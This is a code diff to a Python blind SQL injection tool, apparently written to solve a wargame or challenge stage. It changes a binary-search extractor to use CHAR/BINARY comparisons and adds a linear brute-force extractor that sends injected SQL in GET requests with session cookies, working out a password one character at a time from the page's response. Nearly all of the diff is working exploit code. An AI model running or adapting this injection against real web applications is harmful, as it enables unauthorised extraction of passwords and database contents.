@@ -36,7 +36,7 @@ def get_length(pwning_url, field, add_comment, login_cookies):
         length += 1
 
 
-def do_blind_inject(pwning_url, field, add_comment, login_cookies):
+def do_blind_inject_divide(pwning_url, field, add_comment, login_cookies):
 
     pw = str()
     length = get_length(pwning_url, field, add_comment,login_cookies)
@@ -48,7 +48,7 @@ def do_blind_inject(pwning_url, field, add_comment, login_cookies):
         max_ascii = 127
         while True:
             # password must compare with int in mysql 'a' = 'A' is true
-            url = pwning_url + ' {2} < ASCII(RIGHT(LEFT({0},{1}),1)) {3} '.format(field, idx, int((min_ascii + max_ascii) / 2), '%23' if add_comment else '')
+            url = pwning_url + ' CHAR({2}) < BINARY(RIGHT(LEFT({0},{1}),1)) {3} '.format(field, idx, int((min_ascii + max_ascii) / 2), '%23' if add_comment else '')
             res = requests.get(url, cookies=login_cookies)
             soup = BeautifulSoup(res.text, 'html.parser')
             h2s = soup.find_all('h2')
@@ -64,12 +64,9 @@ def do_blind_inject(pwning_url, field, add_comment, login_cookies):
             if not h2s:
                 max_ascii = int((min_ascii + max_ascii) / 2)
             else:
-
                 min_ascii = int((min_ascii + max_ascii) / 2)
-
-
-
         idx += 1
+
     parsed_url = urlparse(pwning_url)
     origin_url = '{url.scheme}://{url.netloc}/{url.path}'.format(url=parsed_url)
     print('password is {0}'.format(pw))
@@ -84,6 +81,41 @@ def do_blind_inject(pwning_url, field, add_comment, login_cookies):
                 print('Success to clear this stage!')
                 break
 
+
+
+
+def do_blind_inject_linear(pwning_url, field, add_comment, login_cookies):
+
+    pw = str()
+    length = get_length(pwning_url, field, add_comment,login_cookies)
+    idx = 1
+    print('Success to get length {0} is {1} '.format(field, length))
+    while idx <= length:
+        print('Trying to get value index[{0}]'.format(idx))
+        for i in range(32,127):
+            url = pwning_url + ' CHAR({2}) LIKE BINARY(RIGHT(LEFT({0},{1}),1)) {3} '.format(field, idx, i, '%23' if add_comment else '')
+            print(url)
+            res = requests.get(url, cookies=login_cookies)
+            soup = BeautifulSoup(res.text, 'html.parser')
+            h2s = soup.find_all('h2')
+            if h2s:
+                pw += chr(i)
+                break
+        idx += 1
+
+    parsed_url = urlparse(pwning_url)
+    origin_url = '{url.scheme}://{url.netloc}/{url.path}'.format(url=parsed_url)
+    print('password is {0}'.format(pw))
+    res = requests.get(origin_url, params={field: pw}, cookies=login_cookies)
+    soup = BeautifulSoup(res.text, 'html.parser')
+    h2s = soup.find_all('h2')
+    if not h2s:
+        print('Failed to clear! Plz check logic')
+    else:
+        for h2 in h2s:
+            if h2.find('Clear') != -1:
+                print('Success to clear this stage!')
+                break
 
 
 if __name__ == '__main__':
@@ -105,5 +137,16 @@ if __name__ == '__main__':
         if add_comment.lower() == 'y' or add_comment.lower() == 'n':
             break
 
-    do_blind_inject(pwning_url, field, True if add_comment.lower() == 'y' else False, login_cookies)
+    method = int(input('''Chosse 1 method
+    1 : divide and conquer
+    2 : linear 
+    default : divide first and do linear'''))
+
+    if method == 1:
+        do_blind_inject_divide(pwning_url, field, True if add_comment.lower() == 'y' else False, login_cookies)
+    elif method == 2:
+        do_blind_inject_linear(pwning_url, field, True if add_comment.lower() == 'y' else False, login_cookies)
+    else:
+        do_blind_inject_divide(pwning_url, field, True if add_comment.lower() == 'y' else False, login_cookies)
+        do_blind_inject_linear(pwning_url, field, True if add_comment.lower() == 'y' else False, login_cookies)
 
